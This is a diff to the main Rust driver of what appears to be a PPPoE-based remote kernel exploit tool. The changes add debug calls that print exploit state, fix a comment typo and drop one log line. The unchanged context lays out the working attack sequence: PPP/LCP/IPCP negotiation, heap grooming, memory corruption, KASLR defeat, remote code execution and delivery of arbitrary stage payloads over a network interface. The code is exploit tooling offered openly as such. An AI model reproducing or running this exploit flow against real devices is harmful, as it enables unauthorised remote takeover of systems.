@@ -2,7 +2,7 @@ mod constants;
 mod exploit;
 mod parser;
 
-use exploit::{build_fake_ifnet, Exploit};
+use exploit::{build_fake_ifnet, print_current_state, Exploit};
 use parser::{get_args, Args};
 use pnet::datalink::{self};
 
@@ -30,7 +30,7 @@ fn run_exploit(interface_name: String, stage1_path: String, stage2_path: String)
         stage2: vec![0],
     };
 
-    // Load binaries of the two pyaloads
+    // Load binaries of the two payloads
     expl.stage1 = read_stage(&stage1_path).expect("Failed to read Stage 1 file");
     expl.stage2 = read_stage(&stage2_path).expect("Failed to read Stage 2 file");
 
@@ -39,6 +39,9 @@ fn run_exploit(interface_name: String, stage1_path: String, stage2_path: String)
     handler.start();
 
     // Stages of the exploit
+
+    print_current_state(&expl.exploit_state);
+
     println!("\n[+] STAGE 0: Initialization");
     expl.capture_first_padi(&interface);
     let fake_ifnet = build_fake_ifnet(&mut expl.exploit_state);
@@ -46,21 +49,34 @@ fn run_exploit(interface_name: String, stage1_path: String, stage2_path: String)
     expl.lcp_negotiation(&interface);
     expl.ipcp_negotiation(&interface);
     println!("[+] Initial Negotiations Done...");
-    println!("[+] Wait for interface to be ready");
     println!("[+] Starting Heap Grooming...");
     expl.heap_grooming(&interface);
+
+    print_current_state(&expl.exploit_state);
+
     println!("\n[+] STAGE 1: Memory corruption");
+    print_current_state(&expl.exploit_state);
     expl.memory_corruption(&interface);
+
+    print_current_state(&expl.exploit_state);
+
     println!("\n[+] STAGE 2: KASLR defeat");
     expl.defeat_kaslr(&interface);
+
+    print_current_state(&expl.exploit_state);
+
     println!("\n[+] STAGE 3: Remote code execution");
     expl.remote_code_exec(&interface);
     expl.exploit_state.source_mac = constants::SOURCE_MAC;
     expl.ppp_negotiation(&interface, None);
     expl.lcp_negotiation(&interface);
     expl.ipcp_negotiation(&interface);
+
+    print_current_state(&expl.exploit_state);
+
     println!("\n[+] STAGE 4: Arbitrary payload execution");
     expl.frag_and_send(&interface);
+
     println!("\n[+] DONE!");
     // Stop the LCP handler
     handler.stop();
